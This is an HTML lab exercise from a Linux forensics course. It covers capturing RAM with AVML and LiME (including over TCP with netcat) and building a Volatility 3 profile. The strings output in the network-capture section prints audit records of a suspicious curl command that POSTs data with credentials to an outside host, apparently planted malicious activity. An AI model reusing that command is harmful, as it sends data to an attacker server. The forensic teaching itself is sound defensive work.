@@ -1,0 +1,374 @@
+<HTML>
+<HEAD>
+   <TITLE>Exercise 6 -- Linux Forensics</TITLE>
+   <link rel="stylesheet" type="text/css" href="../style/HalEx.css">
+</HEAD>
+<BODY>
+
+<p align="center">
+   <span class="page_title">Exercise 6: Memory Acquisition</span><br>
+   <span class="page_subtitle">Hands-On Exercise</span>
+</p>
+
+<h1>Goals For This Lab<p>
+
+<ol>
+<li>Dump memory with AVML</li><p>
+<li>Dump memory with LiME (to file and over the network)</li><p>
+<li>Create a Volatility profile for the system</li><p>
+</ol>
+</h1>
+
+
+<h1>Before You Get Started</h1>
+
+<p>Just so we can have something interesting to look at in our memory dumps, let's go ahead and re-run
+the <tt>make-artifacts.sh</tt> script we used before running UAC:</p>
+
+<pre>
+[lab@LAB ~]$ <b>sudo -s</b>
+[sudo] password for lab: <b><i>(not echoed)</i></b>
+[root@LAB ~]# <b>bash ~lab/Exercises/Ex_06/make-artifacts.sh</b>
+</pre>
+
+<h1>1. Using AVML</h1>
+
+<p>First we'll use AVML to capture the memory from our virtual
+machine. You will need to be the root (administrative) user to
+capture RAM, and we'll make a working directory to hold our memory
+images:</p>
+
+<pre>
+[root@LAB ~]# <b>mkdir -p /images/lab06</b>
+[root@LAB ~]# <b>cd /images/lab06</b>
+[root@LAB lab06]# 
+</pre>
+
+<p>Now we're ready to capture some RAM!</p>
+
+<pre>
+[root@LAB lab06]# <b>avml memory-avml.lime</b>
+[root@LAB lab06]# <b>ls -lh memory-avml.lime</b>
+-rw------- 1 root root 16G Apr  2 08:46 memory-avml.lime
+</pre>
+
+<p>Looks like AVML made the memory dump read-only. This is probably
+good practice since the memory dump contains sensitive data. But let's
+go ahead and make the file world-readable so we don't have to do all
+of our memory analysis as the root user:</p>
+
+<pre>
+root@LAB:/images/lab06# <b>chmod +r memory-avml.lime</b>
+root@LAB:/images/lab06# <b>ls -lh memory-avml.lime</b>
+-rw-r--r-- 1 root root  16G Apr  2 08:46 memory-avml.lime
+</pre>
+
+<p>In a real investigation, we would <i>never</i> be writing the memory image
+to a file on the disk of the potentially compromised machine.
+That might overwrite important evidence in unallocated blocks.
+On a virtual machine you would need to connect additional storage
+to hold the memory dump, or write out to a USB.</p>
+
+<p>It might be a good idea to make sure there's useful information
+in the memory dump we took. We'll just do a quick check with 
+<tt>strings</tt> and see if there are any recognizable URLs in
+the memory dump:</p>
+
+<pre>
+[root@LAB lab06]# <b>strings -a memory-avml.lime | grep http:// | head</b>
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+http://www.packagekit.org/
+http://www.packagekit.org/
+ For recompression, 7-Zip (http://www.7-zip.com) is used, which generally gives
+Homepage: http://rowetel.com/codec2.html
+Homepage: http://ccb.jhu.edu/software/kraken/
+Homepage: http://krank.sourceforge.net/
+Homepage: http://kraptor.sourceforge.net/
+</pre>
+
+<p>Looking good so far!</p>
+
+
+<h1>2. Using LiME</h1>
+
+<p>You'll find the LiME source code
+in <tt>/usr/local/src/lime/src</tt>.  Let's head on over there and
+run <tt>make</tt> to build the kernel module:</p>
+
+<pre>
+[root@LAB lab06]# <b>cd /usr/local/src/lime/src</b>
+[root@LAB src]# <b>make</b>
+make -C /lib/modules/5.10.0-21-amd64/build M="/usr/local/src/lime/src" modules
+make[1]: Entering directory '/usr/src/linux-headers-5.10.0-21-amd64'
+  CC [M]  /usr/local/src/lime/src/tcp.o
+  CC [M]  /usr/local/src/lime/src/disk.o
+  CC [M]  /usr/local/src/lime/src/main.o
+  CC [M]  /usr/local/src/lime/src/hash.o
+  CC [M]  /usr/local/src/lime/src/deflate.o
+  LD [M]  /usr/local/src/lime/src/lime.o
+  MODPOST /usr/local/src/lime/src/Module.symvers
+  CC [M]  /usr/local/src/lime/src/lime.mod.o
+  LD [M]  /usr/local/src/lime/src/lime.ko
+make[1]: Leaving directory '/usr/src/linux-headers-5.10.0-21-amd64'
+strip --strip-unneeded lime.ko
+mv lime.ko lime-5.10.0-21-amd64.ko
+</pre>
+
+<p>Assuming everything went OK, you should have a <tt>lime-*.ko</tt> 
+file in the directory.  Note the kernel version number will vary
+depending on which version of the OS is currently installed in your VM.</p>
+
+<pre>
+[root@LAB src]# <b>ls *.ko</b>
+lime-5.10.0-21-amd64.ko
+</pre>
+
+<p>Woot! There it is!</p>
+
+<h2>Dumping to a File</h2>
+
+<p>If you've got a USB device handy, you're welcome to try attaching
+it to your VM and dumping memory to that.  But for this example, I'll
+just dump the memory to the local disk.  Again, you would <i>never</i>
+do this during a real investigation. Also note that LiME may take much
+longer to dump memory than AVML did.</p>
+
+<pre>
+[root@LAB src]# <b>insmod lime-*.ko "format=lime path=/images/lab06/memory-lime.lime.gz digest=sha512 compress=1"</b>
+[root@LAB src]# <b>ls -lh /images/lab06</b>
+total 20G
+-rw-r--r-- 1 root root  16G Apr  2 08:46 memory-avml.lime
+-r--r--r-- 1 root root 3.2G Apr  2 09:04 memory-lime.lime.gz
+-r--r--r-- 1 root root  128 Apr  2 09:04 memory-lime.lime.gz.sha512
+</pre>
+
+<p>I'm using the <tt>compress=1</tt> option to dump a compressed memory
+image. You can see that it is substantially smaller than the uncompressed
+image we took with AVML. We were also able to get a SHA512 checksum
+for the memory image we took.</p>
+
+<p>Compression is just designed to make the image faster to save to
+disk or transmit over the network. You will need to decompress the
+image to use it with tools like Volatility. The SHA512 checksum is for
+the <i>uncompressed</i> image.</p>
+
+<pre>
+[root@LAB src]# <b>cd /images/lab06</b>
+[root@LAB lab06]# <b>cat memory-lime.lime.gz.sha512</b>
+7fd55455b3441d2e3f13a5f524e172944217d6fc8df731a72cd874cf69b20c0019585414fd28c4bd2983decaf6c6e77877215acce4c9945af1fcd58bd41bdf6a
+[root@LAB lab06]# <b>sha512sum memory-lime.lime.gz</b>
+4f2912611c46b313aea5078413d654ec1b5eb07467d59ff06169f9b7fdc7c51793b0c9b607d59fa8f81b4e1bf5fb13f780abc39a011f862a454ec288a4d1932d  memory-lime.lime.gz
+[root@LAB lab06]# <b>gunzip memory-lime.lime.gz</b>
+
+gzip: memory-lime.lime.gz: not in gzip format
+[root@LAB lab06]# <b>unpigz memory-lime.lime.gz</b>
+[root@LAB lab06]# <b>ls -lh</b>
+total 32G
+-rw-r--r-- 1 root root 16G Apr  2 08:46 memory-avml.lime
+-r--r--r-- 1 root root 16G Apr  2 09:04 memory-lime.lime
+-r--r--r-- 1 root root 128 Apr  2 09:04 memory-lime.lime.gz.sha512
+[root@LAB lab06]# <b>sha512sum memory-lime.lime</b>
+7fd55455b3441d2e3f13a5f524e172944217d6fc8df731a72cd874cf69b20c0019585414fd28c4bd2983decaf6c6e77877215acce4c9945af1fcd58bd41bdf6a  memory-lime.lime
+</pre>
+
+<p>Notice that you have to use <tt>unpigz</tt> to decompress the 
+image, not <tt>gzip</tt>.
+As before, we'll use strings to verify we got
+at least some readable information in our memory capture:</p>
+
+<pre>
+[root@LAB lab06]# <b>strings -a memory-lime.lime | grep http:// | head</b>
+ * <http://www.gnu.org/licenses/>.
+ *    http://www.sf.net/projects/lksctp
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+http://www.packagekit.org/
+http://www.packagekit.org/
+ For recompression, 7-Zip (http://www.7-zip.com) is used, which generally gives
+Homepage: http://rowetel.com/codec2.html
+Homepage: http://ccb.jhu.edu/software/kraken/
+</pre>
+
+<p>So far, so good!
+
+<h2>Network Capture</h2>
+
+<p>Instead of writing to a file path, you can specify a network port
+with <tt>path=tcp:&lt;port&gt;</tt>.  You can use any available port.</p>
+
+<pre>
+[root@LAB lab06]# <b>cd /usr/local/src/lime/src</b>
+[root@LAB src]# <b>insmod lime-*.ko "format=lime path=tcp:4004 digest=sha512 compress=1"</b>
+insmod: ERROR: could not insert module lime-3.10.0-1062.12.1.el7.x86_64.ko: File exists
+</pre>
+
+<p>Whoops!  The LiME kernel module is still installed from when we
+dumped the system memory to a file.  We have to first remove the old
+module before we can reload it.  <tt>lsmod</tt> lists installed kernel
+modules, and <tt>rmmod</tt> lets you remove them.</p>
+
+<pre>
+[root@LAB src]# <b>lsmod | grep lime</b>
+lime                   16384  0
+[root@LAB src]# <b>rmmod lime</b>
+[root@LAB src]# <b>lsmod | grep lime</b>
+[root@LAB src]# <b>insmod lime-*.ko "format=lime path=tcp:4004 digest=sha512 compress=1" &amp;</b>
+[1] 13046
+[root@LAB src]# <b>netstat -anp | grep 4004</b>
+tcp        0      0 0.0.0.0:4004            0.0.0.0:*               LISTEN      -                   
+</pre>
+
+<p>Once we removed the old LiME module, we were able to reload LiME
+and configure it to listen on a port.  <tt>netstat</tt> shows us that
+the listener is active.</p>
+
+<p>Now all we have to do is connect to the port using Netcat and
+save the resulting dump to a file.<p>
+
+<pre>
+[root@LAB src]# <b>cd /images/lab06/</b>
+[root@LAB lab06]# <b>nc -i 1 localhost 4004 >memory-nc.lime.gz</b>
+Ncat: Idle timeout expired (1000 ms).
+[root@LAB lab06]# <b>nc -i 1 localhost 4004 >memory-nc.lime.gz.sha512</b>
+Ncat: Idle timeout expired (1000 ms).
+[1]+  Done                    insmod lime-*.ko "format=lime path=tcp:4004 digest=sha512 compress=1"  (wd: /usr/local/src/lime/src)
+(wd now: /images/lab06)
+[root@LAB lab06]# <b>ls -lh</b>
+total 39G
+-rw-r--r-- 1 root root  16G Apr  2 08:46 memory-avml.lime
+-r--r--r-- 1 root root  16G Apr  2 09:04 memory-lime.lime
+-r--r--r-- 1 root root  128 Apr  2 09:04 memory-lime.lime.gz.sha512
+-rw-r--r-- 1 root root 7.0G Apr  2 10:06 memory-nc.lime.gz
+-r--r--r-- 1 root root  128 Apr  2 10:06 memory-nc.lime.gz.sha512
+</pre>
+
+<p>To capture both the memory image and the digest, we make two separate
+connections to the port LiME is listening on. Now we can uncompress the
+image, verify the checksum, and make sure we can see useful strings in
+the memory image:</p>
+
+<pre>
+[root@LAB lab06]# <b>unpigz memory-nc.lime.gz</b>
+[root@LAB lab06]# <b>sha512sum memory-nc.lime</b>
+b870d6c537846016d46127b249e9f462c24bd5dea7d3d3c73de2d572a6d71af65c9c010cafb1897f60adcd86883156529bc9dfa20011b48458f1d60f81c7ae76  memory-nc.lime
+[root@LAB lab06]# <b>cat memory-nc.lime.gz.sha512</b>
+b870d6c537846016d46127b249e9f462c24bd5dea7d3d3c73de2d572a6d71af65c9c010cafb1897f60adcd86883156529bc9dfa20011b48458f1d60f81c7ae76
+[root@LAB lab06]# <b>strings -a memory-nc.lime | grep http:// | head</b>
+audit(1638980198.087:16963392): argc=13 a0="curl" a1="-s" a2="--interface" a3="10.0.0.141" a4="--connect-timeout" a5="5" a6="--data-urlencode" a7="cid=865" a8="-X" a9="POST" a10="http://rr.blueheaven.live/1010/iprv.php" a11="-u" a12="client:%@123-456@%"
+$metype":"[\"NORMAL\",\"NORMAL\"]","path_mode":"[\"0100755\",\"0100755\"]","path_ouid":"[\"0\",\"0\"]","path_ogid":"[\"0\",\"0\"]","argc":"13","cmdline":"curl -s --interface 10.0.0.231 --connect-timeout 5 --data-urlencode cid=865 -X POST http://rr.blueheaven.live/1010/iprv.php -u client:%@123-456@%","containerid":"","Timestamp":"2021-12-08T10:52:14.976Z","AuditID":"1638960734.976:16833458","SerialNumber":16833458,"Computer":"ApacheWebServer","ProcessFlags":0},{"RecordTypeCode":14688,"RecordType":"AUOMS_EXECVE","arch":"x86_64","syscall":"execve","syscall_r":"59","success":"yes","exit":"0","a0":"55a31a9060e0","a1":"55a31a905fd0","a2":"55a31a905fe8","a3":"0","ppid":"17948","pid":"17950","audit_user":"azureuser","auid":"1000","user":"daemon","uid":"1","group":"daemon","gid":"1","effective_user":"daemon","euid":"1","set_user":"daemon","suid":"1","filesystem_user":"daemon","fsuid":"1","effective_group":"daemon","egid":"1","set_group":"daemon","sgid":"1","filesystem_group":"daemon","fsgid":"1","tty":"(none)","ses":"563","comm":"awk","exe":"/usr/bin/gawk","key":"auoms","key_r":"\"auoms\"","cwd":"/var/tmp/.log/101068/.spoollog (deleted)","name":"/usr/bin/awk","inode":"4478","dev":"08:11","mode":"file,755","o_user":"root","ouid":"0","owner_group":"root","ogid":"0","rdev":"00:00","nametype":"NORMAL","cap_fp":"0","cap_fi":"0","cap_fe":"0","cap_fver":"0","cap_frootid":"0","path_name":"[\"/usr/bin/awk\",\"/lib64/ld-linux-x86-64.so.2\"]","path_nametype":"[\"NORMAL\",\"NORMAL\"]","path_mode":"[\"0100755\",\"0100755\"]","path_ouid":"[\"0\",\"0\"]","path_ogid":"[\"0\",\"0\"]","argc":"2","cmdline":"awk \"{split(\\$0,a,\\\",\\\"); print a[1]}\"","containerid":"","Timestamp":"2021-12-08T10:52:15.000Z","AuditID":"1638960735.000:16833459","SerialNumber":16833459,"Computer":"ApacheWebServer","ProcessFlags":0},{"RecordTypeCode":14688,"RecordType":"AUOMS_EXECVE","arch":"x86_64","syscall":"execve","syscall_r":"59","success":"yes","exit":"0","a0":"55a31a9060e0","a1":"55a31a905fd0","a2":"55a31a905fe8","a3":"0","ppid":"17951","pid":"17953","audit_user":"azureuser","auid":"1000","user":"daemon","uid":"1","group":"daemon","gid":"1","effective_user":"daemon","euid":"1","set_user":"daemon","suid":"1","filesystem_user":"daemon","fsuid":
+audit(1638980065.463:16962058): argc=13 a0="curl" a1="-s" a2="--interface" a3="10.0.0.21" a4="--connect-timeout" a5="5" a6="--data-urlencode" a7="cid=865" a8="-X" a9="POST" a10="http://rr.blueheaven.live/1010/iprv.php" a11="-u" a12="client:%@123-456@%"
+curl -s --interface 10.0.0.228 --connect-timeout 5 --data-urlencode cid=865 -X POST http://rr.blueheaven.live/1010/iprv.php -u client:%@123-456@%
+.0.77 --connect-timeout 5 --data-urlencode cid=865 -X POST http://rr.bl1
+http://
+http://
+MESSAGE=EXECVE argc=13 a0="curl" a1="-s" a2="--interface" a3="10.0.0.146" a4="--connect-timeout" a5="5" a6="--data-urlencode" a7="cid=865" a8="-X" a9="POST" a10="http://rr.blueheaven.live/1010/iprv.php" a11="-u" a12="client:%@123-456@%"
+MESSAGE=EXECVE argc=13 a0="curl" a1="-s" a2="--interface" a3="10.0.0.214" a4="--connect-timeout" a5="5" a6="--data-urlencode" a7="cid=865" a8="-X" a9="POST" a10="http://rr.blueheaven.live/1010/iprv.php" a11="-u" a12="client:%@123-456@%"
+ contents known to Tracker (http://projects.gnome.org/tracker).
+</pre>
+
+<p>Now all we need are some better Linux memory analysis tools besides
+<tt>strings</tt> and <tt>grep</tt>.</p>
+
+
+<h1>3. Making a Volatility Profile</h1>
+
+<p>As I mentioned in class, building a Linux profile for Volatility v3
+requires having a kernel with debugging symbols. I've installed this
+dependency in the virtual machine we are using.</p>
+
+<p>Let's practice looking for the installation directory using the
+trick I showed you in class:</p>
+
+<pre>
+root@LAB:/images/lab06# <b>find / -name vmlinu\* -size +100M 2>/dev/null</b>
+/usr/lib/debug/boot/vmlinux-5.10.0-21-amd64
+root@LAB:/images/lab06# <b>ls -lh /usr/lib/debug/boot/vmlinux-5.10.0-21-amd64</b>
+-rw-r--r-- 1 root root 627M Jan 21 14:35 /usr/lib/debug/boot/vmlinux-5.10.0-21-amd64
+root@LAB:/images/lab06# <b>file /usr/lib/debug/boot/vmlinux-5.10.0-21-amd64</b>
+/usr/lib/debug/boot/vmlinux-5.10.0-21-amd64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
+     statically linked, BuildID[sha1]=5e5d3209033f927baa645255efe96d23f05c6e52, 
+     with debug_info, not stripped
+</pre>
+
+<p>You can use the system package management tools to see the name of
+the package this kernel came from:</p>
+
+<pre>
+root@LAB:/images/lab06# <b>dpkg -S /usr/lib/debug/boot/vmlinux-5.10.0-21-amd64</b>
+linux-image-5.10.0-21-amd64-dbg: /usr/lib/debug/boot/vmlinux-5.10.0-21-amd64
+root@LAB:/images/lab06# <b>uname -r</b>
+5.10.0-21-amd64
+</pre>
+
+<p>On Debian systems like our lab system, the package name is
+"<tt>linux-&lt;kernel vers&gt;-dbg</tt>". Of course, if somebody just handed
+you a memory image you may not know what kernel version was running when
+the memory was collected. Volatility has a <tt>Banners</tt> plugin
+that can find the kernel info without needing a profile to run:</p>
+
+<pre>
+root@LAB:/images/lab06# <b>vol3.py -f memory-avml.lime banners.Banners</b>
+
+Offset  Banner
+
+0x48a1815c      Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x86f1a258      Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x930b919c      Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x137a69298     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x150d85fa2     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x19191c1da     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.
+0x264a00200     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.162-1 (2023-01-21)
+0x26841e27e     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.162-1 (2023-01-21)
+0x27168f27e     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.162-1 (2023-01-21)
+0x324ec3d9a     Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.162-1 (2023-01-21)
+0x394c06de0     Linux version 5.4.0-1059-azure (buildd@lcy01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #62~18.04.1-Ubuntu SMP Tue Sep 14 17:53:18 UTC 2021 (Ubuntu 5.4.0-1059.62~18.04.1-azure 5.4.140)
+</pre>
+
+<p>Hopefully that will be enough info for you to being hunting down the
+appropriate package if you can't find a debugging kernel on the local
+system.</p>
+
+<p>Having located the debugging kernel on the local system, the next step
+is to generate a Volatility profile by running <tt>dwarf2json</tt>.
+<tt>dwarf2json</tt> is not a standard Debian package, I had to download
+the source code and compile it myself.</p>
+
+<pre>
+root@LAB:/images/lab06# <b>dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-$(uname -r) >Debian-$(uname -r).json</b>
+root@LAB:/images/lab06# <b>ls -lh Debian-*</b>
+-rw-r--r-- 1 root root 32M Apr  2 10:48 Debian-5.10.0-21-amd64.json
+</pre>
+
+<p>At the risk of getting ahead of ourselves, let's run a quick Volatility
+command just to verify the profile is working:</p>
+
+<pre>
+root@LAB:/images/lab06# <b>vol3.py -s . -f memory-avml.lime linux.pslist.PsList</b>
+
+OFFSET (V)      PID     TID     PPID    COMM
+
+0x93de401f2f80  1       1       0       systemd
+0x93de401f5f00  2       2       0       kthreadd
+0x93de401f4740  3       3       2       rcu_gp
+0x93de401f17c0  4       4       2       rcu_par_gp
+0x93de402adf00  6       6       2       kworker/0:0H
+0x93de402a97c0  8       8       2       mm_percpu_wq
+0x93de402a8000  9       9       2       rcu_tasks_rude_
+    <i>[... snip ...]</i>
+</pre>
+
+<p>The "<tt>-s .</tt>" flag tells volatility to look for our profile in the
+current directory. If we get output from the plugin, Volatility has found
+our profile and is using it to parse the memory image. Hooray!</p>
+
+
+<h1> </h1>
+<hr>
+<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Linux Forensics</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Hal Pomeranz</span> is licensed under a 
+<br><a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+
+</BODY>
+</HTML>
